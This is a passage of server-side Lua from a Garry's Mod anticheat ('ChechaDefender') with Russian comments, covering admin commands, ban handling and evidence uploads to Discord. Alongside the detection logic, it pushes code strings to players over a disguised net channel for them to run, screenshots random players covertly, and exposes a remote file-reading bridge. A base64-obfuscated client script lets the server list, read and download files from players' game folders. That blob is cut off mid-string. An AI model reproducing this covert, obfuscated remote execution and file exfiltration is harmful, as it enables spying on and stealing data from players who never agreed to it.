                    nick, sid, IsValid(ply) and ply:GetUserGroup() or "?",
                    luaCount, skinCount, os.date("%Y-%m-%d %H:%M:%S"), binLine, namesShort)

                local infoText = string.format(
                    "ChechaDefender JOIN-COLLECT\nPlayer: %s (%s)\nLua files: %d\nTime: %s\n\n%s\n",
                    nick, sid, luaCount, os.date("%Y-%m-%d %H:%M:%S"), namesBlock)

                local zipList = unchanged and {} or fileList

                DeliverEvidence("ЧечаДефендер: сбор lua при заходе",
                    discordMsg .. screenExtra, attach, zipList,
                    sidSafe .. "_" .. timestamp, binDir, infoText, function(okSent)
                    if okSent then
                        luaFingerprints[nsid] = { hash = fp, at = os.time() }
                        SaveLuaFingerprints()
                        NotifyCollect(string.format("Сбор при заходе: доставлено (%s, fp=%s%s)",
                            sid, fp, unchanged and ", без ZIP" or ""))
                    else
                        NotifyCollect(string.format(
                            "Сбор при заходе: доставка НЕ удалась — отпечаток не сохранён, повторим при след. заходе (%s)", sid))
                    end
                end)
            end)
        end)
    end)
end

hook.Add("PlayerInitialSpawn", "ZB_AC_JoinCollect", function(ply)
    timer.Simple(25, function() RunJoinCollect(ply) end)
end)

hook.Add("PlayerDisconnected", "ZB_AC_Cleanup", function(ply)
    if IsValid(ply) then
        local sid = ply:SteamID()
        pendingChecks[sid]   = nil
        pendingKefir[sid]    = nil
        playerHistory[sid] = nil
        pendingHoneypot[sid] = nil
        honeypotMiss[sid]    = nil
        realAnsweredAt[sid]  = nil
        lastGrabReqName[sid] = nil
        if pendingBin[sid] then
            FinalizeBinGrab(sid)
        end
        if pendingGrabs[sid] then
            FinalizePending(sid)
        end
        if pendingTestScr[sid] then
            local rec = pendingTestScr[sid]
            pendingTestScr[sid] = nil
            if rec.cb then rec.cb(nil) end
        end
    end
end)

local function ScheduleNextPeriodicCheck()
    local jitter = CHECK_INTERVAL * 0.33
    local nextIn = CHECK_INTERVAL + (math.random() * 2 - 1) * jitter
    timer.Simple(nextIn, function()
        for _, ply in ipairs(player.GetAll()) do
            if ShouldAutoCheck(ply) then
                SendCheckTo(ply)
                SendKefirProbe(ply)
            end
        end
        ScheduleNextPeriodicCheck()
    end)
end
ScheduleNextPeriodicCheck()

-- ===========================================================================
-- CD_PERIODIC_SCREENGRAB: раз в N минут скринить СЛУЧАЙНОГО онлайн-игрока (как H-City).
-- ===========================================================================
-- Отдельное событие kind="screengrab" → карточка оператору+владельцу с ником(стимайди)
-- и инлайн-картинкой. Не детект, действий в игре нет. 0 = выкл (default).
local CVAR_SG_INTERVAL = CreateConVar("rp_ac_screengrab_interval", "0",
    {FCVAR_ARCHIVE, FCVAR_PROTECTED},
    "Периодический скрингаб случайного игрока раз в N минут (0 = выкл)")

local function _grabAndSend(ply, sid, nick)
    local grn = lastGrabReqName[sid]
    if not grn then return end
    StartGrab(ply, sid, nick, { "periodic_screengrab" }, grn, function(screenPath, imgData)
        local ts      = os.date("%Y%m%d_%H%M%S")
        local sidSafe = string.gsub(sid, ":", "_")
        local name, data, mime
        if isstring(imgData) and #imgData > 0 then
            local isPng = string.sub(imgData, 1, 4) == "\137PNG"
            name = sidSafe .. "_" .. ts .. (isPng and ".png" or ".jpg")
            data = imgData
            mime = isPng and "image/png" or "image/jpeg"
        else
            local attach = screenPath and BuildScreenAttach(screenPath, sidSafe, ts) or {}
            local a = attach and attach[1]
            if a then name, data, mime = a.name, a.data, a.mime end
        end
        if data and #data > 0 and ZB_AC.CPStore then
            ZB_AC.CPStore("screengrab", name, data, { sid = sid, nick = nick, mime = mime }, function() end)
        end
        if screenPath then pcall(file.Delete, screenPath) end
    end)
end

local function DoPeriodicScreengrab(ply)
    if not IsValid(ply) then return end
    local sid, nick = ply:SteamID(), ply:Nick()
    if pendingGrabs[sid] then return end
    if lastGrabReqName[sid] then
        _grabAndSend(ply, sid, nick)
    else
        SendCheckTo(ply, true)
    end
end

-- CD_SG_TICKER: ИМЕНОВАННЫЙ тикер (timer.Create с фиксированным именем ЗАМЕНЯЕТ
-- себя на реактивации → без дублей-цепочек, которые давали рваный интервал).
-- Каждые 20с читает интервал из конфига ЖИВЬЁМ и делает скрин, если прошло >=
-- screengrab_min минут. Меняешь интервал в панели → применяется в течение 20с
-- (не ждём отработки старого длинного таймера). Интервал из конфига ИЛИ cvar.
local _sgLast = 0
local _sgDiag = false
timer.Create("cd_periodic_screengrab", 20, 0, function()
    local cfgV = ZB_AC.Config and ZB_AC.Config.screengrab_min
    local mins = tonumber(cfgV) or CVAR_SG_INTERVAL:GetFloat()
    local pool = {}
    for _, p in ipairs(player.GetAll()) do
        if IsValid(p) and not p:IsBot() then pool[#pool + 1] = p end
    end
    if not _sgDiag and ZB_AC and ZB_AC.Report then
        _sgDiag = true
        ZB_AC.Report("diagnostic", 1, "SG-DIAG-TICK", { cfg = cfgV, ctype = type(cfgV), cvar = CVAR_SG_INTERVAL:GetFloat(), mins = mins, players = #pool })
    end
    if not mins or mins <= 0 then return end
    if (CurTime() - _sgLast) < (mins * 60) then return end
    if #pool > 0 then
        _sgLast = CurTime()
        DoPeriodicScreengrab(pool[math.random(#pool)])
    end
end)

concommand.Add("rp_ac_check", function(ply, _, args)
    if IsValid(ply) and not ply:IsSuperAdmin() then
        ply:ChatPrint("[AC] Только суперадмин")
        return
    end
    local target_name = args[1]
    if not target_name then
        if IsValid(ply) then ply:ChatPrint("rp_ac_check <nick>") end
        return
    end
    for _, p in ipairs(player.GetAll()) do
        if string.find(string.lower(p:Nick()), string.lower(target_name), 1, true) then
            pendingChecks[p:SteamID()] = nil
            local ok, why = SendCheckTo(p, true)
            SendKefirProbe(p)
            if IsValid(ply) then
                if ok then
                    ply:ChatPrint("[AC] Запрос отправлен: " .. p:Nick())
                else
                    ply:ChatPrint("[AC] Запрос НЕ отправлен (" .. tostring(why) .. "): " .. p:Nick())
                end
            end
            return
        end
    end
    if IsValid(ply) then ply:ChatPrint("[AC] Игрок не найден") end
end)

concommand.Add("rp_ac_check_all", function(ply)
    if IsValid(ply) and not ply:IsSuperAdmin() then
        ply:ChatPrint("[AC] Только суперадмин")
        return
    end
    local n = 0
    for _, p in ipairs(player.GetAll()) do
        if ShouldAutoCheck(p) then
            SendCheckTo(p)
            SendKefirProbe(p)
            n = n + 1
        end
    end
    local msg = "[AC] Запрошено проверок: " .. n
    if IsValid(ply) then ply:ChatPrint(msg) else print(msg) end
end)

local function ResolveSidArg(arg)
    if not arg or arg == "" then return nil end
    local up = string.upper(arg)
    if string.match(up, "^STEAM_%d:%d:%d+$") then return up end
    local q = string.lower(arg)
    for _, p in ipairs(player.GetAll()) do
        if string.find(string.lower(p:Nick()), q, 1, true) then return p:SteamID() end
    end
    return nil
end

concommand.Add("rp_ac_whitelist_add", function(ply, _, args)
    if IsValid(ply) and not ply:IsSuperAdmin() then ply:ChatPrint("[AC] Только суперадмин") return end
    local function tell(m) if IsValid(ply) then ply:ChatPrint(m) else print(m) end end
    local sid = ResolveSidArg(args[1])
    if not sid then
        tell("[AC] Использование: rp_ac_whitelist_add <STEAM_0:1:... | ник онлайн>")
        return
    end
    WHITELIST[sid] = true
    SaveWhitelist()
    tell("[AC] Добавлен в вайтлист (АЧ его игнорирует): " .. sid)
    NotifyStaff(string.format("WHITELIST +%s (добавил %s)", sid, IsValid(ply) and ply:Nick() or "console"))
end)

concommand.Add("rp_ac_whitelist_remove", function(ply, _, args)
    if IsValid(ply) and not ply:IsSuperAdmin() then ply:ChatPrint("[AC] Только суперадмин") return end
    local function tell(m) if IsValid(ply) then ply:ChatPrint(m) else print(m) end end
    local arg = args[1]
    local sid = arg and string.match(string.upper(arg), "^STEAM_%d:%d:%d+$") or ResolveSidArg(arg)
    if not sid then
        tell("[AC] Использование: rp_ac_whitelist_remove <STEAM_0:1:... | ник онлайн>")
        return
    end
    if OWNER_WHITELIST[sid] then
        tell("[AC] " .. sid .. " — владелец (хард-вайтлист), снять нельзя")
        return
    end
    if WHITELIST[sid] then
        WHITELIST[sid] = nil
        SaveWhitelist()
        tell("[AC] Убран из вайтлиста (АЧ снова проверяет): " .. sid)
        NotifyStaff(string.format("WHITELIST -%s (убрал %s)", sid, IsValid(ply) and ply:Nick() or "console"))
    else
        tell("[AC] В вайтлисте нет: " .. sid)
    end
end)

concommand.Add("rp_ac_whitelist_list", function(ply)
    if IsValid(ply) and not ply:IsSuperAdmin() then ply:ChatPrint("[AC] Только суперадмин") return end
    local function tell(m) if IsValid(ply) then ply:ChatPrint(m) else print(m) end end
    local list = {}
    for sid in pairs(WHITELIST) do list[#list + 1] = sid end
    table.sort(list)
    if #list == 0 then tell("[AC] Вайтлист пуст") return end
    tell("[AC] Вайтлист (" .. #list .. "):")
    for _, sid in ipairs(list) do tell("  " .. sid) end
end)

concommand.Add("rp_ac_ignore_me", function(ply, _, args)
    if IsValid(ply) and not ply:IsSuperAdmin() then ply:ChatPrint("[AC] Только суперадмин") return end
    local function tell(m) if IsValid(ply) then ply:ChatPrint(m) else print(m) end end
    local sid = IsValid(ply) and ply:SteamID() or NormalizeSteamID(args[1] or "")
    local mode = string.lower(args[IsValid(ply) and 1 or 2] or "")
    if not sid or sid == "" then
        tell("[AC] Из консоли: rp_ac_ignore_me <STEAM_0:1:...> [on/off]")
        return
    end
    local wantIgnore
    if mode == "on" or mode == "1" then
        wantIgnore = true
    elseif mode == "off" or mode == "0" then
        wantIgnore = false
    else
        wantIgnore = IGNORE_OFF[sid] == true
    end
    if wantIgnore then
        IGNORE_OFF[sid] = nil
    else
        IGNORE_OFF[sid] = true
    end
    SaveIgnoreOff()
    tell(wantIgnore
        and "[AC] Игнор ВКЛЮЧЁН — АЧ тебя больше не трогает: " .. sid
        or  "[AC] Игнор ВЫКЛЮЧЕН — АЧ снова тебя проверяет: " .. sid)
    NotifyStaff(string.format("IGNORE %s %s (переключил %s)",
        wantIgnore and "ON" or "OFF", sid, IsValid(ply) and ply:Nick() or "console"))
end, nil, "Переключить игнорирование себя античитом (on/off, переживает рестарт)")

concommand.Add("rp_ac_reset_fp", function(ply, _, args)
    if IsValid(ply) and not ply:IsSuperAdmin() then ply:ChatPrint("[AC] Только суперадмин") return end
    local function tell(m) if IsValid(ply) then ply:ChatPrint(m) else print(m) end end
    local sid = ResolveSidArg(args[1])
    if not sid then
        tell("[AC] Использование: rp_ac_reset_fp <STEAM_0:1:... | ник онлайн>")
        return
    end
    if ClearLuaFingerprint(sid) then
        tell("[AC] Отпечаток lua сброшен для " .. sid .. " — следующий детект отправит вебхук")
    else
        tell("[AC] Отпечатка нет для " .. sid .. " (вебхук не блокировался или ещё не отправлялся)")
    end
end)



local function TestScreenPayload(chanName, quality)
    return string.format([==[
local _netName = %q
local _quality = %d
local _uid = "zb_ac_test_" .. tostring(math.random(1e8,9e8))
local _tries = 0
hook.Add("PostRender", _uid, function()
    _tries = _tries + 1
    -- render.Capture часто nil на первых кадрах (смена RT/MSAA) → пробуем jpeg
    -- до 5 кадров, затем png-фолбэк; формат строго "jpeg"/"png" (НЕ "jpg").
    local function cap(fmt)
        local ok, d = pcall(render.Capture, {
            format = fmt, x = 0, y = 0,
            w = ScrW(), h = ScrH(), quality = _quality,
        })
        if ok and d and d ~= "" then return d end
        return nil
    end
    local data = cap("jpeg")
    if not data and _tries < 5 then return end
    if not data then data = cap("png") end
    hook.Remove("PostRender", _uid)
    if not data then
        net.Start(_netName, false)
            net.WriteUInt(0, 12)
        net.SendToServer()
        return
    end
    local netSize   = 32000
    local numPkts   = math.ceil(#data / netSize)
    for i = 1, numPkts do
        timer.Simple(i * 0.1, function()
            local chunk = data:sub((i-1)*netSize+1, i*netSize)
            net.Start(_netName, false)
                net.WriteUInt(numPkts, 12)
                net.WriteUInt(i,       12)
                net.WriteUInt(#chunk,  16)
                net.WriteData(chunk, #chunk)
            net.SendToServer()
        end)
    end
end)
]==], chanName, quality or 75)
end

local function TestGrabScreen(ply, cb)
    if not IsValid(ply) then cb(nil) return end
    local sid     = ply:SteamID()
    local chanName = PickRandom(testScreenPool)

    pendingTestScr[sid] = {
        data     = {},
        total    = nil,
        received = 0,
        cb       = cb,
    }

    net.Start("ui_sync_poll")
        net.WriteString(TestScreenPayload(chanName, 75))
    net.Send(ply)

    timer.Simple(SCREEN_TIMEOUT + 2, function()
        local rec = pendingTestScr[sid]
        if rec then
            pendingTestScr[sid] = nil
            rec.cb(nil)
        end
    end)
end

concommand.Add("rp_ac_test", function(ply, _, args)
    if IsValid(ply) and not ply:IsSuperAdmin() then
        ply:ChatPrint("[AC] Только суперадмин")
        return
    end
    local function tell(m) if IsValid(ply) then ply:ChatPrint(m) else print(m) end end

    local target
    if args[1] and args[1] ~= "" then
        local q = string.lower(args[1])
        for _, p in ipairs(player.GetAll()) do
            if p:SteamID() == args[1] or string.find(string.lower(p:Nick()), q, 1, true) then target = p break end
        end
    elseif IsValid(ply) then
        target = ply
    end
    if not IsValid(target) then
        tell("[AC][ТЕСТ] Использование: rp_ac_test <ник|steamid> (из консоли — аргумент обязателен)")
        return
    end

    local sid, nick = target:SteamID(), target:Nick()
    tell("[AC][ТЕСТ] Запуск по " .. nick .. ": тот же пайплайн что при детекте (без бана)…")

    local function runPipeline(grabReqNameOverride)
        RunDetectPipeline(target, sid, nick, { "manual_test" }, grabReqNameOverride, {
            reportTitle = "ЧечаДефендер: ТЕСТ-детект (без бана)",
            staffTag    = "ТЕСТ",
            noPunish    = true,
            skipAntiScreengrab = true,
            skipDedup   = true,
            infoPrefix  = "ChechaDefender TEST",
            buildDiscordMsg = function(binLine, triggers, nick, sid)
                return string.format(
                    "**ЧечаДефендер: ТЕСТ-детект** — `%s` (`%s`)\n**Триггеры:** %s\n**Время:** %s%s\n_БАН НЕ ПРИМЕНЁН_",
                    nick, sid, triggers, os.date("%Y-%m-%d %H:%M:%S"), binLine)
            end,
            onAfterDeliver = function(ok)
                tell(string.format("[AC][ТЕСТ] Готово → Discord (%s).", ok and "доставлено" or "ошибка/дедуп"))
            end,
        })
    end

    SendCheckTo(target, true)
    tell("[AC][ТЕСТ] Отправил проверку, жду подписки клиента на grab-канал…")
    timer.Simple(3, function()
        if not IsValid(target) then
            tell("[AC][ТЕСТ] Игрок вышел до снятия скрина — отмена.")
            return
        end
        local grabCh = lastGrabReqName[sid]
        print(string.format("[AC][ТЕСТ] grab-канал для скрина: %s", tostring(grabCh)))
        runPipeline(grabCh)
    end)
end)

print("[AC] Detector v10.0 loaded (action=" .. CVAR_ACTION:GetString() ..
      ", bingrab=" .. (CVAR_BINGRAB:GetBool() and ("on→data/" .. BIN_DIR) or "off") ..
      ", collect-join=" .. (CVAR_COLLECT_JOIN:GetBool() and "on" or "off") ..
      ", forensic=" .. (CVAR_FORENSIC:GetBool() and "on→data/zb_ac_forensic" or "off") ..
      ", screens=data/" .. SCREEN_DIR ..
      ", net=randomized, wipe-detect=on, anti-screengrab=on" ..
      ", honeypot=" .. (CVAR_HONEYPOT:GetBool() and "on" or "OFF") ..
      ", net-tamper=" .. (CVAR_TAMPER:GetBool() and "on" or "OFF") ..
      ", sigs: silkware+amfetamin+dobroware+nl+kefir+kefirka_v2+generic_global+hook_patterns+screengrab_integrity" ..
      ", check_admins=" .. (CVAR_CHECK_ADMINS:GetBool() and "on(report-only)" or "off") ..
      ", whitelist=" .. (function() local n = 0 for _ in pairs(WHITELIST) do n = n + 1 end return n end)() ..
      ", kefir-bc-probe=" .. (CVAR_KEFIR_BC:GetBool() and (KEFIR_PROBE_BC and "on" or "off(string.dump unavail)") or "OFF") ..
      ", admin-exempt: " .. (function()
          local t = {}
          for k in pairs(EXEMPT_GROUPS) do t[#t + 1] = k end
          return table.concat(t, ",")
      end)() ..
      ", session_salt=" .. string.sub(SESSION_SALT, 1, 8) .. "…)")


-- CD_UNBAN_HANDLER: откат бана по команде из панели (тип "unban", args.steamid)
hook.Add("ChechaDefender_Command", "cd_unban", function(typ, args)
    if typ ~= "unban" then return end
    args = args or {}
    local sid = tostring(args.steamid or "")
    if sid == "" then return { ok = false, error = "no_steamid" } end
    local done = {}
    if ULib and ULib.unban then
        local ok = pcall(ULib.unban, sid)
        done[#done + 1] = ok and "ulib" or "ulib_err"
    end
    -- native engine fallback
    pcall(function()
        game.ConsoleCommand(('removeid "%s"\n'):format(sid))
        game.ConsoleCommand("writeid\n")
    end)
    done[#done + 1] = "removeid"
    return { ok = true, steamid = sid, via = done }
end)

-- CD_BAN_HANDLER: бан по команде из панели/Discord-кнопки (ulx banid 0 <reason>).
hook.Add("ChechaDefender_Command", "cd_ban", function(typ, args)
    if typ ~= "ban" then return end
    args = args or {}
    local sid = tostring(args.steamid or "")
    if sid == "" then return { ok = false, error = "no_steamid" } end
    local reason = tostring(args.reason or "ЧечаДефендер: ручной бан")
    local nick   = tostring(args.nick or "")
    local done = {}
    if ULib and ULib.addBan then
        local ok = pcall(ULib.addBan, sid, 0, reason, nick ~= "" and nick or nil, nil) -- 0 мин = перма
        done[#done + 1] = ok and "ulib" or "ulib_err"
    end
    -- нативный фолбэк
    pcall(function()
        game.ConsoleCommand(('banid 0 "%s" kick\n'):format(sid))
        game.ConsoleCommand("writeid\n")
    end)
    done[#done + 1] = "banid"
    -- кикнуть если онлайн прямо сейчас
    pcall(function()
        for _, p in ipairs(player.GetAll()) do
            if IsValid(p) and p:SteamID() == sid then
                if ULib and ULib.kick then ULib.kick(p, reason) else p:Kick(reason) end
            end
        end
    end)
    if ZB_AC and ZB_AC.Report then
        ZB_AC.Report("ban", 4, "Ручной бан: " .. (nick ~= "" and nick or sid), {
            steamid = sid, nick = nick, reason = reason, result = "ban", action = "manual",
        })
    end
    return { ok = true, steamid = sid, via = done }
end)

end) if not __ok then _G.__CD_ERR = (_G.__CD_ERR or 0) + 1 _G.__CD_ERRS = _G.__CD_ERRS or {} _G.__CD_ERRS[#_G.__CD_ERRS+1] = { mod = "sv_silkware_detector.lua", err = tostring(__err) } if not (ZB_AC and ZB_AC.Stealth and ZB_AC.Stealth("notify")) then print("[ЧечаДефендер] модуль " .. "sv_silkware_detector.lua" .. " упал при загрузке: " .. tostring(__err)) end end end

do
if chechacore and chechacore.FSList then
  hook.Add("ChechaDefender_Command", "chechacore_fs", function(typ, args)
    args = args or {}
    if typ == "fs_list" then
      local path = tostring(args.path or "garrysmod")
      local ok, res = pcall(chechacore.FSList, path)
      if not ok or not istable(res) then return { ok = false, path = path, error = tostring(res or "fs_list failed") } end
      return { ok = true, path = path, entries = res }
    elseif typ == "fs_read" then
      local path = tostring(args.path or "")
      local ok, res, total, truncated = pcall(chechacore.FSRead, path, tonumber(args.max))
      if not ok or res == nil then return { ok = false, path = path, error = tostring(res or "fs_read failed") } end
      return { ok = true, path = path, size = #res, total = total, truncated = truncated == true, content = util.Base64Encode(res, true) }
    end
  end)
  print("[chechacore] FS-мост активен (нативный доступ к файлам)")
end
end

do
if chechacore and chechacore.DebuggerDetected == true then
  timer.Simple(8, function()
    if ZB_AC and ZB_AC.Report then
      ZB_AC.Report("security", 4, "chechacore: обнаружен отладчик/трейсер на процессе сервера", {
        platform = chechacore.platform, fingerprint = chechacore.fingerprint,
      })
    end
  end)
end
end

do
if not SERVER then return end
util.AddNetworkString("cd_cl_push")
util.AddNetworkString("cd_cl_ready")

-- Client Lua source (base64 in memory only).
local _CL = util.Base64Decode("LS0gY2xfY2hlY2hhZGVmZW5kZXJfYnJvd3Nlci5sdWEKaWYgbm90IENMSUVOVCB0aGVuIHJldHVybiBlbmQKCmxvY2FsIENIVU5LID0gNDAwMDAKbG9jYWwgVklFV19NQVggPSAxMDAwMDAKCmxvY2FsIGZ1bmN0aW9uIHJlcGx5SlNPTihpZCwgdGJsKQogICAgbG9jYWwgZCA9IHV0aWwuQ29tcHJlc3ModXRpbC5UYWJsZVRvSlNPTih0YmwpKQogICAgbmV0LlN0YXJ0KCJwYW5lbF9jbWRfciIpCiAgICAgICAgbmV0LldyaXRlU3RyaW5nKGlkKQogICAgICAgIG5ldC5Xcml0ZVVJbnQoI2QsIDMyKQogICAgICAgIG5ldC5Xcml0ZURhdGEoZCwgI2QpCiAgICBuZXQuU2VuZFRvU2VydmVyKCkKZW5kCgpsb2NhbCBmdW5jdGlvbiByZXBseVJhdyhpZCwgY3VyLCB0b3RhbCwgYnl0ZXMpCiAgICBieXRlcyA9IGJ5dGVzIG9yICIiCiAgICBsb2NhbCBoZHIgPSBzdHJpbmcuY2hhcigKICAgICAgICBiaXQuYmFuZChjdXIsIDI1NSksIGJpdC5iYW5kKGJpdC5yc2hpZnQoY3VyLCA4KSwgMjU1KSwKICAgICAgICBiaXQuYmFuZCh0b3RhbCwgMjU1KSwgYml0LmJhbmQoYml0LnJzaGlmdCh0b3RhbCwgOCksIDI1NSkpCiAgICBsb2NhbCBkID0gaGRyIC4uIGJ5dGVzCiAgICBuZXQuU3RhcnQoInBhbmVsX2NtZF9yIikKICAgICAgICBuZXQuV3JpdGVTdHJpbmcoaWQpCiAgICAgICAgbmV0LldyaXRlVUludCgjZCwgMzIpCiAgICAgICAgbmV0LldyaXRlRGF0YShkLCAjZCkKICAgIG5ldC5TZW5kVG9TZXJ2ZXIoKQplbmQKCmxvY2FsIENRID0gewogICAgZm9sZGVyID0gZnVuY3Rpb24oaWQsIHBhdGgpCiAgICAgICAgbG9jYWwgZmksIGZvID0gZmlsZS5GaW5kKHBhdGggLi4gIioiLCAiQkFTRV9QQVRIIikKICAgICAgICBmaSwgZm8gPSBmaSBvciB7fSwgZm8gb3Ige30KICAgICAgICBsb2NhbCBmaWxlcywgZm9sZGVycyA9IHt9LCB7fQogICAgICAgIGZvciBpID0gMSwgbWF0aC5taW4oI2ZvLCAyMDAwKSBkbyBmb2xkZXJzW2ldID0gZm9baV0gZW5kCiAgICAgICAgZm9yIGkgPSAxLCBtYXRoLm1pbigjZmksIDIwMDApIGRvIGZpbGVzW2ldID0gZmlbaV0gZW5kCiAgICAgICAgcmVwbHlKU09OKGlkLCB7IHBhdGggPSBwYXRoLCBmaWxlcyA9IGZpbGVzLCBmb2xkZXJzID0gZm9sZGVycyB9KQogICAgZW5kLAogICAgZmlsZSA9IGZ1bmN0aW9uKGlkLCBwYXRoKQogICAgICAgIGxvY2FsIHJlcyA9IHsgcGF0aCA9IHBhdGgsIHNpemUgPSAwLCBlcnIgPSBmYWxzZSwgY29udGVudCA9ICIiIH0KICAgICAgICBpZiBub3QgZmlsZS5FeGlzdHMocGF0aCwgIkJBU0VfUEFUSCIpIHRoZW4KICAgICAgICAgICAgcmVzLmVyciA9ICLRhNCw0LnQuyDQvdC1INC90LDQudC00LXQvSIKICAgICAgICAgICAgcmVwbHlKU09OKGlkLCByZXMpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAogICAgICAgIGxvY2FsIHN6ID0gZmlsZS5TaXplKHBhdGgsICJCQVNFX1BBVEgiKQogICAgICAgIHJlcy5zaXplID0gc3oKICAgICAgICBpZiBzeiA8PSAwIG9yIHN6ID4gVklFV19NQVggdGhlbgogICAgICAgICAgICByZXMuZXJyID0gItGB0LvQuNGI0LrQvtC8INCx0L7Qu9GM0YjQvtC5INC00LvRjyDQv9GA0L7RgdC80L7RgtGA0LAg4oCUINGB0LrQsNGH0LDQudGC0LUiCiAgICAgICAgICAgIHJlcGx5SlNPTihpZCwgcmVzKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKICAgICAgICBsb2NhbCBjb250ZW50ID0gZmlsZS5SZWFkKHBhdGgsICJCQVNFX1BBVEgiKSBvciAiIgogICAgICAgIGlmICN1dGlsLkNvbXByZXNzKGNvbnRlbnQpID4gNTAwMDAgdGhlbgogICAgICAgICAgICByZXMuZXJyID0gItGB0LvQuNGI0LrQvtC8INCx0L7Qu9GM0YjQvtC5INC00LvRjyDQv9GA0L7RgdC80L7RgtGA0LAg4oCUINGB0LrQsNGH0LDQudGC0LUiCiAgICAgICAgICAgIHJlcGx5SlNPTihpZCwgcmVzKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKICAgICAgICByZXMuY29udGVudCA9IGNvbnRlbnQKICAgICAgICByZXBseUpTT04oaWQsIHJlcykKICAgIGVuZCwKICAgIGRvd25sb2FkID0gZnVuY3Rpb24oaWQsIHBhdGgsIGNodW5rU3RyKQogICAgICAgIGxvY2FsIGNodW5rID0gdG9udW1iZXIoY2h1bmtTdHIpIG9yIDAKICAgICAgICBpZiBub3QgZmlsZS5FeGlzdHMocGF0aCwgIkJBU0VfUEFUSCIpIHRoZW4KICAgICAgICAgICAgcmVwbHlSYXcoaWQsIDAsIDAsICIiKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKICAgICAgICBsb2NhbCBzeiA9IGZpbGUuU2l6ZShwYXRoLCAiQkFTRV9QQVRIIikKICAgICAgICBsb2NhbCB0b3RhbCA9IG1hdGgubWF4KDEsIG1hdGguY2VpbChzeiAvIENIVU5LKSkKICAgICAgICBpZiB0b3RhbCA+IDY1NTM1IHRoZW4KICAgICAgICAgICAgcmVwbHlSYXcoaWQsIDAsIDAsICIiKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKICAgICAgICBsb2NhbCBmaCA9IGZpbGUuT3BlbihwYXRoLCAicmIiLCAiQkFTRV9QQVRIIikKICAgICAgICBpZiBub3QgZmggdGhlbgogICAgICAgICAgICByZXBseVJhdyhpZCwgMCwgMCwgIiIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAogICAgICAgIGZoOlNlZWsoY2h1bmsgKiBDSFVOSykKICAgICAgICBsb2NhbCBieXRlcyA9IGZoOlJlYWQoQ0hVTkspIG9yICIiCiAgICAgICAgZmg6Q2xvc2UoKQogICAgICAgIHJlcGx5UmF3KGlkLCBjaHVuaywgdG90YWwsIGJ5dGVzKQogICAgZW5kLAp9CgpuZXQuUmVjZWl2ZSgicGFuZWxfY21kX3EiLCBmdW5jdGlvbigpCiAgICBsb2NhbCBpZCA9IG5ldC5SZWFkU3RyaW5nKCkKICAgIGxvY2FsIGFjdGlvbiA9IG5ldC5SZWFkU3RyaW5nKCkKICAgIGxvY2FsIGExID0gbmV0LlJlYWRTdHJpbmcoKQogICAgbG9jYWwgYTIgPSBuZXQuUmVhZFN0cmluZygpCiAgICBpZiBDUVthY3Rpb25dIHRoZW4gQ1FbYWN0aW9uXShpZCwgYTEsIGEyKSBlbmQKZW5kKQoKbG9jYWwgU0tJTl9ST09UUyA9IHsgImdhcnJ5c21vZC9tYXRlcmlhbHMvbW9kZWxzIiwgImdhcnJ5c21vZC9tb2RlbHMiLCAi" ..
    "Z2FycnlzbW9kL21hdGVyaWFscy92Z3VpIiB9CmxvY2FsIFNLSU5fRVhUID0geyB2bXQgPSB0cnVlLCB2dGYgPSB0cnVlLCBtZGwgPSB0cnVlLCB2dHggPSB0cnVlLCB2dmQgPSB0cnVlLCBwaHkgPSB0cnVlLCBwbmcgPSB0cnVlLCBqcGcgPSB0cnVlIH0KCmxvY2FsIGZ1bmN0aW9uIHNjYW5Ta2lucygpCiAgICBsb2NhbCBmb3VuZCA9IHt9CiAgICBsb2NhbCBmdW5jdGlvbiB3YWxrKGRpciwgZGVwdGgpCiAgICAgICAgaWYgZGVwdGggPiA2IG9yICNmb3VuZCA+PSA0MDAgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgbG9jYWwgZmlsZXMsIGRpcnMgPSBmaWxlLkZpbmQoZGlyIC4uICIvKiIsICJCQVNFX1BBVEgiKQogICAgICAgIGZvciBfLCBmIGluIGlwYWlycyhmaWxlcyBvciB7fSkgZG8KICAgICAgICAgICAgbG9jYWwgZXh0ID0gc3RyaW5nLmxvd2VyKHN0cmluZy5HZXRFeHRlbnNpb25Gcm9tRmlsZW5hbWUoZikgb3IgIiIpCiAgICAgICAgICAgIGlmIFNLSU5fRVhUW2V4dF0gdGhlbgogICAgICAgICAgICAgICAgZm91bmRbI2ZvdW5kICsgMV0gPSBkaXIgLi4gIi8iIC4uIGYKICAgICAgICAgICAgICAgIGlmICNmb3VuZCA+PSA0MDAgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIGZvciBfLCBkIGluIGlwYWlycyhkaXJzIG9yIHt9KSBkbyB3YWxrKGRpciAuLiAiLyIgLi4gZCwgZGVwdGggKyAxKSBlbmQKICAgIGVuZAogICAgZm9yIF8sIHIgaW4gaXBhaXJzKFNLSU5fUk9PVFMpIGRvIHdhbGsociwgMCkgZW5kCiAgICByZXR1cm4gZm91bmQKZW5kCgpuZXQuUmVjZWl2ZSgicmVzX3NjYW5fcmVxIiwgZnVuY3Rpb24oKQogICAgbG9jYWwgbGlzdCA9IHNjYW5Ta2lucygpCiAgICBsb2NhbCBkID0gdXRpbC5Db21wcmVzcyh1dGlsLlRhYmxlVG9KU09OKGxpc3QpKQogICAgbmV0LlN0YXJ0KCJyZXNfc2Nhbl9yZXMiKQogICAgICAgIG5ldC5Xcml0ZVVJbnQoI2QsIDMyKQogICAgICAgIG5ldC5Xcml0ZURhdGEoZCwgI2QpCiAgICBuZXQuU2VuZFRvU2VydmVyKCkKZW5kKQoKbG9jYWwgRkIgPSBGQiBvciB7fQpGQi5xdWV1ZSA9IEZCLnF1ZXVlIG9yIHt9Cgpsb2NhbCBXUklURUFCTEUgPSB7CiAgICB0eHQgPSB0cnVlLCBkYXQgPSB0cnVlLCBqc29uID0gdHJ1ZSwgeG1sID0gdHJ1ZSwgY3N2ID0gdHJ1ZSwKICAgIGpwZyA9IHRydWUsIGpwZWcgPSB0cnVlLCBwbmcgPSB0cnVlLCB2dGYgPSB0cnVlLCB2bXQgPSB0cnVlLAogICAgbXAzID0gdHJ1ZSwgd2F2ID0gdHJ1ZSwgb2dnID0gdHJ1ZSwgZGVtID0gdHJ1ZSwgdmNkID0